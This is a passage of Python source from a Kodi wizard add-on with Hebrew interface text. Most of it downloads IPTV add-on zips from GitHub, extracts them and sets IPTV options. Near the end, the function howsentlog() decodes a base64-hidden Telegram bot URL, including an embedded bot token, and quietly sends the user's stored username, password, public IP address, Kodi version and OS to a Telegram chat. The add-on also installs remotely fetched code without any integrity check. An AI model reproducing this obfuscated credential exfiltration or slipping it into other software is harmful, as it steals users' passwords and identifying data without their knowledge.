        bytes_so_far += len(buffer)
        f.write(buffer)

        if not header:
            total_size = bytes_so_far # unknown size
        if dp.iscanceled(): 
           dp.close()
           try:
            os.remove(OOooO)
           except:
            pass
           break
        percent = float(bytes_so_far) / total_size
        percent = round(percent*100, 2)
        currently_downloaded=bytes_so_far/ (1024 * 1024) 
        total=total_size/ (1024 * 1024) 
        mbs = '[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]' % ('teal', 'skyblue', currently_downloaded, 'teal', total) 
        if (time.time() - start_time) >0:
          kbps_speed = bytes_so_far / (time.time() - start_time) 
          kbps_speed = kbps_speed / 1024 
        else:
         kbps_speed=0
        type_speed = 'KB'
        if kbps_speed >= 1024:
           kbps_speed = kbps_speed / 1024 
           type_speed = 'MB'
        if kbps_speed > 0 and not percent == 100: 
            eta = (total_size - bytes_so_far) / kbps_speed 
        else: 
            eta = 0
        e   = '[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s ' % ('teal', 'skyblue', kbps_speed, type_speed)

        dp.update(int(percent), "Downloading " +name,mbs,e )
        #sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))
  
  II111iiii = xbmc . translatePath ( os . path . join ( 'special://home' ) )


  f.close()
  extract  ( OOooO , II111iiii,dp )
  xbmc.executebuiltin("RunPlugin(plugin://plugin.program.Anonymous/?mode=kodi17fix)" )

  try:
    os.remove(OOooO)

  except:
    pass
  dialog = xbmcgui.Dialog()
  xbmc.sleep(5000)
  dialog.ok("Kodi Setting", 'הפעולה הושלמה - הקודי יסגר כעת')
  os._exit(1)
  
  
  
  
  
  
def iptvkodi17(): # הרחבה בשם לוקי שאותה בודקים


      if xbmc.getCondVisibility('system.platform.windows') and KODIV>=17 and KODIV<18 :
        import json
        
        enable = "true"
        addon_id = 'pvr.iptvsimple'
        addon = '"%s"' % addon_id
        
        if xbmc.getCondVisibility("System.HasAddon(%s)" % addon_id) and enable == "true":
            logging.warning('already Enabled')
            xbmc.executebuiltin('Addon.OpenSettings(%s)' % 'pvr.iptvsimple')
            return xbmc.log("### Skipped %s, reason = allready enabled" % addon_id)
            
        elif not xbmc.getCondVisibility("System.HasAddon(%s)" % addon_id) and enable == "false":
            return xbmc.log("### Skipped %s, reason = not installed" % addon_id)
        else:
            
            do_json = '{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}' % (addon, enable)
            query = xbmc.executeJSONRPC(do_json)
            response = json.loads(query)
            xbmc.executebuiltin('Addon.OpenSettings(%s)' % 'pvr.iptvsimple')
            if enable == "true":
                xbmc.log("### Enabled %s, response = %s" % (addon_id, response))
            else:
                xbmc.log("### Disabled %s, response = %s" % (addon_id, response))
                
        if mode=='auto':
         return True

        # return xbmc.executebuiltin('Container.Update(%s)' % xbmc.getInfoLabel('Container.FolderPath'))
      if xbmc.getCondVisibility('system.platform.windows') and KODIV>=18:
          if not os.path.exists(os.path.join(ADDONS, 'pvr.iptvsimple')):
              
              link='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'
              iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
              iiiI11 = xbmcgui . DialogProgress ( )
              try:
                iiiI11 . create ( "XBMC ISRAEL" , "Downloading " +'iptv', '' , 'Please Wait' )
              except:
                iiiI11 . create ( "XBMC ISRAEL" , "Downloading " +'iptv')
              OOooO = os . path . join ( iiI1iIiI , 'isr.zip' )
              # req = urllib2.Request(link)
              remote_file = urlopen(link)
              #the_page = response.read()
              dp = xbmcgui.DialogProgress()
              dp.create("Downloading", "Downloading " +'iptv')
              dp.update(0)

              f = open(OOooO, 'wb')

              try:
                total_size = remote_file.info().getheader('Content-Length').strip()
                header = True
              except AttributeError:
                    header = False # a response doesn't always include the "Content-Length" header

              if header:
                    total_size = int(total_size)

              bytes_so_far = 0
              start_time=time.time()
              while True:
                    buffer = remote_file.read(8192)
                    if not buffer:
                        sys.stdout.write('\n')
                        break

                    bytes_so_far += len(buffer)
                    f.write(buffer)

                    if not header:
                        total_size = bytes_so_far # unknown size
                    if dp.iscanceled(): 
                       dp.close()
                       try:
                        os.remove(OOooO)
                       except:
                        pass
                       break
                    percent = float(bytes_so_far) / total_size
                    percent = round(percent*100, 2)
                    currently_downloaded=bytes_so_far/ (1024 * 1024) 
                    total=total_size/ (1024 * 1024) 
                    mbs = '[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]' % ('teal', 'skyblue', currently_downloaded, 'teal', total) 
                    if (time.time() - start_time) >0:
                      kbps_speed = bytes_so_far / (time.time() - start_time) 
                      kbps_speed = kbps_speed / 1024 
                    else:
                     kbps_speed=0
                    type_speed = 'KB'
                    if kbps_speed >= 1024:
                       kbps_speed = kbps_speed / 1024 
                       type_speed = 'MB'
                    if kbps_speed > 0 and not percent == 100: 
                        eta = (total_size - bytes_so_far) / kbps_speed 
                    else: 
                        eta = 0
                    e   = '[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s ' % ('teal', 'skyblue', kbps_speed, type_speed)

                    dp.update(int(percent), "Downloading " +'iptv'+'\n'+mbs+'\n'+e )
                    #sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))
              
              II111iiii = xbmc . translatePath ( os . path . join ( 'special://home/addons' ) )


              f.close()
              extract  ( OOooO , II111iiii,dp )
              # mode
              # enable=="true"
              # dis_or_enable_addon('pvr.iptvsimple',enable)
              xbmc.executebuiltin("RunPlugin(plugin://plugin.program.Anonymous/?mode=kodi17fix)" )

              try:
                os.remove(OOooO)

              except:
                pass
              dp.close()
              # dialog = xbmcgui.Dialog()
              xbmc.sleep(5000)
              # enable=="true"
              # dis_or_enable_addon('pvr.iptvsimple',enable)
              tttt='התקנת IPTV'
              LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, tttt),'[COLOR %s]הקודי יסגר כעת...[/COLOR]' % COLOR2)
              time.sleep(5)
              # dialog.ok("Kodi Setting", 'הפעולה הושלמה - הקודי יסגר כעת')
              os._exit(1)
          xbmc.executebuiltin('Addon.OpenSettings(%s)' % 'pvr.iptvsimple')
      if xbmc.getCondVisibility('system.platform.android') and KODIV>=18:
          if not os.path.exists(os.path.join(ADDONS, 'pvr.iptvsimple')):
              link='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'
              iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
              iiiI11 = xbmcgui . DialogProgress ( )
              iiiI11 . create ( "XBMC ISRAEL" , "Downloading " +'iptv', '' , 'Please Wait' )
              OOooO = os . path . join ( iiI1iIiI , 'isr.zip' )
              req = urllib2.Request(link)
              remote_file = urlopen(req)
              #the_page = response.read()
              dp = xbmcgui.DialogProgress()
              dp.create("Downloading", "Downloading " +'iptv')
              dp.update(0)

              f = open(OOooO, 'wb')

              try:
                total_size = remote_file.info().getheader('Content-Length').strip()
                header = True
              except AttributeError:
                    header = False # a response doesn't always include the "Content-Length" header

              if header:
                    total_size = int(total_size)

              bytes_so_far = 0
              start_time=time.time()
              while True:
                    buffer = remote_file.read(8192)
                    if not buffer:
                        sys.stdout.write('\n')
                        break

                    bytes_so_far += len(buffer)
                    f.write(buffer)

                    if not header:
                        total_size = bytes_so_far # unknown size
                    if dp.iscanceled(): 
                       dp.close()
                       try:
                        os.remove(OOooO)
                       except:
                        pass
                       break
                    percent = float(bytes_so_far) / total_size
                    percent = round(percent*100, 2)
                    currently_downloaded=bytes_so_far/ (1024 * 1024) 
                    total=total_size/ (1024 * 1024) 
                    mbs = '[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]' % ('teal', 'skyblue', currently_downloaded, 'teal', total) 
                    if (time.time() - start_time) >0:
                      kbps_speed = bytes_so_far / (time.time() - start_time) 
                      kbps_speed = kbps_speed / 1024 
                    else:
                     kbps_speed=0
                    type_speed = 'KB'
                    if kbps_speed >= 1024:
                       kbps_speed = kbps_speed / 1024 
                       type_speed = 'MB'
                    if kbps_speed > 0 and not percent == 100: 
                        eta = (total_size - bytes_so_far) / kbps_speed 
                    else: 
                        eta = 0
                    e   = '[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s ' % ('teal', 'skyblue', kbps_speed, type_speed)

                    dp.update(int(percent), "Downloading " +'iptv',mbs,e )
                    #sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))
              
              II111iiii = xbmc . translatePath ( os . path . join ( 'special://home/addons' ) )


              f.close()
              extract  ( OOooO , II111iiii,dp )
              xbmc.executebuiltin("RunPlugin(plugin://plugin.program.Anonymous/?mode=kodi17fix)" )

              try:
                os.remove(OOooO)

              except:
                pass
              dp.close()
              # dialog = xbmcgui.Dialog()
              xbmc.sleep(5000)
              # enable=="true"
              # dis_or_enable_addon('pvr.iptvsimple',enable)
              tttt='התקנת IPTV'
              LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, tttt),'[COLOR %s]הקודי יסגר כעת...[/COLOR]' % COLOR2)
              time.sleep(5)
              # dialog.ok("Kodi Setting", 'הפעולה הושלמה - הקודי יסגר כעת')
              os._exit(1)
          # enable=="true"
          # dis_or_enable_addon('pvr.iptvsimple',enable)
          xbmc.executebuiltin('Addon.OpenSettings(%s)' % 'pvr.iptvsimple')
      if xbmc.getCondVisibility('system.platform.android')and KODIV<=18 and KODIV>=17 :
        import json
        
        enable = "true"
        addon_id = 'pvr.iptvsimple'
        addon = '"%s"' % addon_id
        
        if xbmc.getCondVisibility("System.HasAddon(%s)" % addon_id) and enable == "true":
            logging.warning('already Enabled')
            xbmc.executebuiltin('Addon.OpenSettings(%s)' % 'pvr.iptvsimple')
            return xbmc.log("### Skipped %s, reason = allready enabled" % addon_id)
            
        elif not xbmc.getCondVisibility("System.HasAddon(%s)" % addon_id) and enable == "false":
            return xbmc.log("### Skipped %s, reason = not installed" % addon_id)
        else:
            
            do_json = '{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}' % (addon, enable)
            query = xbmc.executeJSONRPC(do_json)
            response = json.loads(query)
            xbmc.executebuiltin('Addon.OpenSettings(%s)' % 'pvr.iptvsimple')
            if enable == "true":
                xbmc.log("### Enabled %s, response = %s" % (addon_id, response))
            else:
                xbmc.log("### Disabled %s, response = %s" % (addon_id, response))
                
        if mode=='auto':
         return True

        return xbmc.executebuiltin('Container.Update(%s)' % xbmc.getInfoLabel('Container.FolderPath'))
  
  
def iptvkodi18idan(): # הרחבה בשם לוקי שאותה בודקים
      Addon = xbmcaddon.Addon('plugin.video.idanplus')
      Addon.setSetting('useIPTV','true')
      if xbmc.getCondVisibility('system.platform.windows') and KODIV>=18:
          if not os.path.exists(os.path.join(ADDONS, 'pvr.iptvsimple')):
              
              link='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'
              iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
              iiiI11 = xbmcgui . DialogProgress ( )
              iiiI11 . create ( "XBMC ISRAEL" , "Downloading " +'הגדרת ערוצי עידן פלוס', '' , 'Please Wait' )
              OOooO = os . path . join ( iiI1iIiI , 'isr.zip' )
              req = urllib2.Request(link)
              remote_file = urlopen(req)
              #the_page = response.read()
              dp = xbmcgui.DialogProgress()
              dp.create("Downloading", "Downloading " +'הגדרת ערוצי עידן פלוס')
              dp.update(0)

              f = open(OOooO, 'wb')

              try:
                total_size = remote_file.info().getheader('Content-Length').strip()
                header = True
              except AttributeError:
                    header = False # a response doesn't always include the "Content-Length" header

              if header:
                    total_size = int(total_size)

              bytes_so_far = 0
              start_time=time.time()
              while True:
                    buffer = remote_file.read(8192)
                    if not buffer:
                        sys.stdout.write('\n')
                        break

                    bytes_so_far += len(buffer)
                    f.write(buffer)

                    if not header:
                        total_size = bytes_so_far # unknown size
                    if dp.iscanceled(): 
                       dp.close()
                       try:
                        os.remove(OOooO)
                       except:
                        pass
                       break
                    percent = float(bytes_so_far) / total_size
                    percent = round(percent*100, 2)
                    currently_downloaded=bytes_so_far/ (1024 * 1024) 
                    total=total_size/ (1024 * 1024) 
                    mbs = '[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]' % ('teal', 'skyblue', currently_downloaded, 'teal', total) 
                    if (time.time() - start_time) >0:
                      kbps_speed = bytes_so_far / (time.time() - start_time) 
                      kbps_speed = kbps_speed / 1024 
                    else:
                     kbps_speed=0
                    type_speed = 'KB'
                    if kbps_speed >= 1024:
                       kbps_speed = kbps_speed / 1024 
                       type_speed = 'MB'
                    if kbps_speed > 0 and not percent == 100: 
                        eta = (total_size - bytes_so_far) / kbps_speed 
                    else: 
                        eta = 0
                    e   = '[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s ' % ('teal', 'skyblue', kbps_speed, type_speed)

                    dp.update(int(percent), "Downloading " +'iptv',mbs,e )
                    #sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))
              
              II111iiii = xbmc . translatePath ( os . path . join ( 'special://home/addons' ) )


              f.close()
              extract  ( OOooO , II111iiii,dp )
              # mode
              # enable="true"
              # dis_or_enable_addon('pvr.iptvsimple',enable)
              # xbmc.executebuiltin("RunPlugin(plugin://plugin.program.Anonymous/?mode=kodi17fix)" )

              try:
                os.remove(OOooO)

              except:
                pass
              dp.close()
              # dialog = xbmcgui.Dialog()
              # xbmc.sleep(5000)
              enable="true"
              dis_or_enable_addon('pvr.iptvsimple',enable)
              
              # xbmc.executebuiltin("RunPlugin(plugin://plugin.video.idanplus/?mode=4&module=iptv)" )
              tttt='התקנת IPTV'

          # xbmc.executebuiltin('Addon.OpenSettings(%s)' % 'pvr.iptvsimple')
      if xbmc.getCondVisibility('system.platform.android') and KODIV>=18:
          if not os.path.exists(os.path.join(ADDONS, 'pvr.iptvsimple')):
              link='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'
              iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
              iiiI11 = xbmcgui . DialogProgress ( )
              iiiI11 . create ( "XBMC ISRAEL" , "Downloading " +'הגדרת ערוצי עידן פלוס', '' , 'Please Wait' )
              OOooO = os . path . join ( iiI1iIiI , 'isr.zip' )
              req = urllib2.Request(link)
              remote_file = urlopen(req)
              #the_page = response.read()
              dp = xbmcgui.DialogProgress()
              dp.create("Downloading", "Downloading " +'הגדרת ערוצי עידן פלוס')
              dp.update(0)

              f = open(OOooO, 'wb')

              try:
                total_size = remote_file.info().getheader('Content-Length').strip()
                header = True
              except AttributeError:
                    header = False # a response doesn't always include the "Content-Length" header

              if header:
                    total_size = int(total_size)

              bytes_so_far = 0
              start_time=time.time()
              while True:
                    buffer = remote_file.read(8192)
                    if not buffer:
                        sys.stdout.write('\n')
                        break

                    bytes_so_far += len(buffer)
                    f.write(buffer)

                    if not header:
                        total_size = bytes_so_far # unknown size
                    if dp.iscanceled(): 
                       dp.close()
                       try:
                        os.remove(OOooO)
                       except:
                        pass
                       break
                    percent = float(bytes_so_far) / total_size
                    percent = round(percent*100, 2)
                    currently_downloaded=bytes_so_far/ (1024 * 1024) 
                    total=total_size/ (1024 * 1024) 
                    mbs = '[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]' % ('teal', 'skyblue', currently_downloaded, 'teal', total) 
                    if (time.time() - start_time) >0:
                      kbps_speed = bytes_so_far / (time.time() - start_time) 
                      kbps_speed = kbps_speed / 1024 
                    else:
                     kbps_speed=0
                    type_speed = 'KB'
                    if kbps_speed >= 1024:
                       kbps_speed = kbps_speed / 1024 
                       type_speed = 'MB'
                    if kbps_speed > 0 and not percent == 100: 
                        eta = (total_size - bytes_so_far) / kbps_speed 
                    else: 
                        eta = 0
                    e   = '[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s ' % ('teal', 'skyblue', kbps_speed, type_speed)

                    dp.update(int(percent), "Downloading " +'iptv',mbs,e )
                    #sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))
              
              II111iiii = xbmc . translatePath ( os . path . join ( 'special://home/addons' ) )


              f.close()
              extract  ( OOooO , II111iiii,dp )
              # # xbmc.executebuiltin("RunPlugin(plugin://plugin.program.Anonymous/?mode=kodi17fix)" )
              # enable=="true"
              # dis_or_enable_addon('pvr.iptvsimple',enable)
              try:
                os.remove(OOooO)

              except:
                pass
              dp.close()
              # dialog = xbmcgui.Dialog()
              # xbmc.executebuiltin("RunPlugin(plugin://plugin.video.idanplus/?mode=4&module=iptv)" )

          # enable=="true"
          # dis_or_enable_addon('pvr.iptvsimple',enable)
          # xbmc.executebuiltin('Addon.OpenSettings(%s)' % 'pvr.iptvsimple')

  
  
  
  
  
  
def iptvidanplus():
    Addon = xbmcaddon.Addon('plugin.video.idanplus')
    Addon.setSetting('useIPTV','true')
    xbmc.executebuiltin("RunPlugin(plugin://plugin.video.idanplus/?mode=7)" )

    
    if KODIV>=17 and KODIV<18 :
      # xbmc.executebuiltin("RunPlugin(plugin://plugin.video.idanplus/?mode=7)" )
      link='https://github.com/vip200/victory/blob/master/idanplus17.zip?raw=true'
      iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
      iiiI11 = xbmcgui . DialogProgress ( )
      iiiI11 . create ( "XBMC ISRAEL" , "Downloading " +'הגדרת ערוצים', '' , 'Please Wait' )
      OOooO = os . path . join ( iiI1iIiI , 'isr.zip' )
      req = urllib2.Request(link)
      remote_file = urlopen(req)
      #the_page = response.read()
      dp = xbmcgui.DialogProgress()
      dp.create("Downloading", "Downloading " +'הגדרת ערוצים')
      dp.update(0)

      f = open(OOooO, 'wb')

      try:
        total_size = remote_file.info().getheader('Content-Length').strip()
        header = True
      except AttributeError:
            header = False # a response doesn't always include the "Content-Length" header

      if header:
            total_size = int(total_size)

      bytes_so_far = 0
      start_time=time.time()
      while True:
            buffer = remote_file.read(8192)
            if not buffer:
                sys.stdout.write('\n')
                break

            bytes_so_far += len(buffer)
            f.write(buffer)

            if not header:
                total_size = bytes_so_far # unknown size
            if dp.iscanceled(): 
               dp.close()
               try:
                os.remove(OOooO)
               except:
                pass
               break
            percent = float(bytes_so_far) / total_size
            percent = round(percent*100, 2)
            currently_downloaded=bytes_so_far/ (1024 * 1024) 
            total=total_size/ (1024 * 1024) 
            mbs = '[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]' % ('teal', 'skyblue', currently_downloaded, 'teal', total) 
            if (time.time() - start_time) >0:
              kbps_speed = bytes_so_far / (time.time() - start_time) 
              kbps_speed = kbps_speed / 1024 
            else:
             kbps_speed=0
            type_speed = 'KB'
            if kbps_speed >= 1024:
               kbps_speed = kbps_speed / 1024 
               type_speed = 'MB'
            if kbps_speed > 0 and not percent == 100: 
                eta = (total_size - bytes_so_far) / kbps_speed 
            else: 
                eta = 0
            e   = '[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s ' % ('teal', 'skyblue', kbps_speed, type_speed)

            dp.update(int(percent), "Downloading " +'הגדרת ערוצים',mbs,e )
            #sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))
      
      II111iiii = xbmc . translatePath ( os . path . join ( 'special://home/' ) )


      f.close()
      extract  ( OOooO , II111iiii,dp )
      xbmc.executebuiltin("RunPlugin(plugin://plugin.program.Anonymous/?mode=kodi17fix)" )

      try:
        os.remove(OOooO)

      except:
        pass
        
        
      import json
        
      enable = "true"
      addon_id = 'pvr.iptvsimple'
      addon = '"%s"' % addon_id
        
      if xbmc.getCondVisibility("System.HasAddon(%s)" % addon_id) and enable == "true":
            logging.warning('already Enabled')
            # xbmc.executebuiltin('Addon.OpenSettings(%s)' % 'pvr.iptvsimple')
            Addoniptv = xbmcaddon.Addon('pvr.iptvsimple')
            Addoniptv.setSetting('epgTimeShift','1.000000')
            Addoniptv.setSetting('m3uPathType','0')
            Addoniptv.setSetting('epgPathType','0')
            Addoniptv.setSetting('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')
            Addoniptv.setSetting('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus2.m3u')
            xbmc.executebuiltin("RunPlugin(plugin://plugin.video.idanplus/?mode=7)" )
            LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, 'הגדרת ערוצי עידן פלוס'),'[COLOR %s]הושלם בהצלחה[/COLOR]' % COLOR2)
            return xbmc.log("### Skipped %s, reason = allready enabled" % addon_id)
            
      elif not xbmc.getCondVisibility("System.HasAddon(%s)" % addon_id) and enable == "false":
            Addoniptv = xbmcaddon.Addon('pvr.iptvsimple')
            Addoniptv.setSetting('epgTimeShift','1.000000')
            Addoniptv.setSetting('m3uPathType','0')
            Addoniptv.setSetting('epgPathType','0')
            Addoniptv.setSetting('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')
            Addoniptv.setSetting('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus2.m3u')
            # xbmc.executebuiltin("RunPlugin(plugin://plugin.video.idanplus/?mode=7)" )
            LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, 'הגדרת ערוצי עידן פלוס'),'[COLOR %s]הושלם בהצלחה[/COLOR]' % COLOR2)
            return xbmc.log("### Skipped %s, reason = not installed" % addon_id)
      else:
            
            do_json = '{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}' % (addon, enable)
            query = xbmc.executeJSONRPC(do_json)
            response = json.loads(query)
            # xbmc.executebuiltin('Addon.OpenSettings(%s)' % 'pvr.iptvsimple')
            if enable == "true":
                xbmc.log("### Enabled %s, response = %s" % (addon_id, response))
            else:
                xbmc.log("### Disabled %s, response = %s" % (addon_id, response))
                
      if mode=='auto':
         return True
        
        
        
      dialog = xbmcgui.Dialog()
      

      xbmc.executebuiltin("RunPlugin(plugin://plugin.program.Anonymous/?mode=kodi17fix)" )
      time.sleep(5)
      Addoniptv = xbmcaddon.Addon('pvr.iptvsimple')
      Addoniptv.setSetting('epgTimeShift','1.000000')
      Addoniptv.setSetting('m3uPathType','0')
      Addoniptv.setSetting('epgPathType','0')
      Addoniptv.setSetting('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')
      Addoniptv.setSetting('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus2.m3u')
      # xbmc.executebuiltin("RunPlugin(plugin://plugin.video.idanplus/?mode=7)" )
      LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, 'הגדרת ערוצי עידן פלוס'),'[COLOR %s]הושלם בהצלחה[/COLOR]' % COLOR2)
      time.sleep(5)
      dialog.ok("Kodi Setting", 'הפעולה הושלמה - הקודי יסגר כעת')
      os._exit(1)

    if KODIV>=18: 
      if not os.path.exists(os.path.join(ADDONS, 'pvr.iptvsimple')):
        iptvkodi18idan()
        xbmc.executebuiltin("RunPlugin(plugin://plugin.program.Anonymous/?mode=kodi17fix)" )
        time.sleep(10)
        Addoniptv = xbmcaddon.Addon('pvr.iptvsimple')
        Addoniptv.setSetting('epgTimeShift','1.000000')
        Addoniptv.setSetting('m3uPathType','0')
        Addoniptv.setSetting('epgPathType','0')
        Addoniptv.setSetting('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')
        Addoniptv.setSetting('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus3.m3u')
        # xbmc.executebuiltin("RunPlugin(plugin://plugin.video.idanplus/?mode=7)" )
        tttt='הגדרת ערוצי עידן פלוס'
        LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, tttt),'[COLOR %s]הקודי יסגר כעת...[/COLOR]' % COLOR2)
        time.sleep(5)
      # dialog.ok("Kodi Setting", 'הפעולה הושלמה - הקודי יסגר כעת')
        os._exit(1)
        
    xbmc.executebuiltin("RunPlugin(plugin://plugin.program.Anonymous/?mode=kodi17fix)" )
    Addoniptv = xbmcaddon.Addon('pvr.iptvsimple')
    Addoniptv.setSetting('epgTimeShift','1.000000')
    Addoniptv.setSetting('m3uPathType','0')
    Addoniptv.setSetting('epgPathType','0')
    Addoniptv.setSetting('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')
    # xbmc.executebuiltin("RunPlugin(plugin://plugin.video.idanplus/?mode=7)" )
    if KODIV>=18: 
     Addoniptv.setSetting('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus3.m3u')
    if KODIV>=17 and KODIV<18 :
     Addoniptv.setSetting('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus2.m3u')
    
    
def iptvkodi18win(): # הרחבה בשם לוקי שאותה בודקים
      if not os.path.exists(os.path.join(ADDONS, 'pvr.iptvsimple')):
          link='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'
          iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
          iiiI11 = xbmcgui . DialogProgress ( )
          iiiI11 . create ( "XBMC ISRAEL" , "Downloading " +name, '' , 'Please Wait' )
          OOooO = os . path . join ( iiI1iIiI , 'isr.zip' )
          req = urllib2.Request(link)
          remote_file = urlopen(req)
          #the_page = response.read()
          dp = xbmcgui.DialogProgress()
          dp.create("Downloading", "Downloading " +name)
          dp.update(0)

          f = open(OOooO, 'wb')

          try:
            total_size = remote_file.info().getheader('Content-Length').strip()
            header = True
          except AttributeError:
                header = False # a response doesn't always include the "Content-Length" header

          if header:
                total_size = int(total_size)

          bytes_so_far = 0
          start_time=time.time()
          while True:
                buffer = remote_file.read(8192)
                if not buffer:
                    sys.stdout.write('\n')
                    break

                bytes_so_far += len(buffer)
                f.write(buffer)

                if not header:
                    total_size = bytes_so_far # unknown size
                if dp.iscanceled(): 
                   dp.close()
                   try:
                    os.remove(OOooO)
                   except:
                    pass
                   break
                percent = float(bytes_so_far) / total_size
                percent = round(percent*100, 2)
                currently_downloaded=bytes_so_far/ (1024 * 1024) 
                total=total_size/ (1024 * 1024) 
                mbs = '[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]' % ('teal', 'skyblue', currently_downloaded, 'teal', total) 
                if (time.time() - start_time) >0:
                  kbps_speed = bytes_so_far / (time.time() - start_time) 
                  kbps_speed = kbps_speed / 1024 
                else:
                 kbps_speed=0
                type_speed = 'KB'
                if kbps_speed >= 1024:
                   kbps_speed = kbps_speed / 1024 
                   type_speed = 'MB'
                if kbps_speed > 0 and not percent == 100: 
                    eta = (total_size - bytes_so_far) / kbps_speed 
                else: 
                    eta = 0
                e   = '[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s ' % ('teal', 'skyblue', kbps_speed, type_speed)

                dp.update(int(percent), "Downloading " +name,mbs,e )
                #sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))
          
          II111iiii = xbmc . translatePath ( os . path . join ( 'special://home/addons' ) )


          f.close()
          extract  ( OOooO , II111iiii,dp )
          xbmc.executebuiltin("RunPlugin(plugin://plugin.program.Anonymous/?mode=kodi17fix)" )

          try:
            os.remove(OOooO)

          except:
            pass
          dialog = xbmcgui.Dialog()
          xbmc.sleep(5000)
          dialog.ok("Kodi Setting", 'הפעולה הושלמה - הקודי יסגר כעת')
          os._exit(1)
      xbmc.executebuiltin('Addon.OpenSettings(%s)' % 'pvr.iptvsimple')
  # xbmc.sleep(5000)
  # dialog.ok("Kodi Setting", 'הפעולה הושלמה - הקודי יסגר כעת')
  # os._exit(1)

def howsentlog():
    wizard=xbmcaddon.Addon('plugin.program.Anonymous')
    import json
    input= (wizard.getSetting("user"))
    input2= (wizard.getSetting("pass"))
    kodiinfo=(xbmc.getInfoLabel("System.BuildVersion")[:4])
    #freshStart(name)
    error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0=').decode('utf-8')
    x=urlopen('https://api.ipify.org/?format=json').read()
    local_ip=str(json.loads(x)['ip'])
    userr=input
    passs=input2
    xbmc.getInfoLabel('System.OSVersionInfo')
    xbmc.sleep(1500)
    label = xbmc.getInfoLabel('System.OSVersionInfo')

    import socket
    x=urlopen(error_ad+que('שלח לוג: ') +que(' שם משתמש: ')+userr +que(' סיסמה: ')+passs+que(' קודי: ')+kodiinfo+que(' כתובת: ')+local_ip+que(' מערכת הפעלה: ')+platform()).readlines()


def logsend():

        Addon = xbmcaddon.Addon()
        try:
            user_dataDir_pre = translatepath(Addon.getAddonInfo("profile")).decode("utf-8")
        except:
            user_dataDir_pre = translatepath(Addon.getAddonInfo("profile"))
        if not os.path.exists(user_dataDir_pre):
            os.makedirs(user_dataDir_pre)
        LogNotify2("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]שולח לוג אנא המתן[/COLOR]' % COLOR2)
        nameSelect=[]
